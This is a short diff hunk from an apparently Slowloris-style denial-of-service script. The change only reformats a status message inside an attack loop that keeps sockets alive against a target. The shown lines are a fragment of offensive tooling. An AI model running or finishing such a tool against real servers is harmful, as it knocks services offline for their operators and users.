@@ -42,7 +42,7 @@ def recreate_sockets(list_of_sockets, max_sockets, target):
 
 def attack(list_of_sockets, max_sockets, target):
     while True:
-        print("Attacking %s with %s sockets" %(target, len(list_of_sockets))) # Printing this every time just in case some sockets die or are made
+        print("-----Attacking %s with %s sockets-----" %(target, len(list_of_sockets))) # Printing this every time just in case some sockets die or are made
         for sock in list_of_sockets:
             try:
                 sock.keep_alive(list_of_sockets)
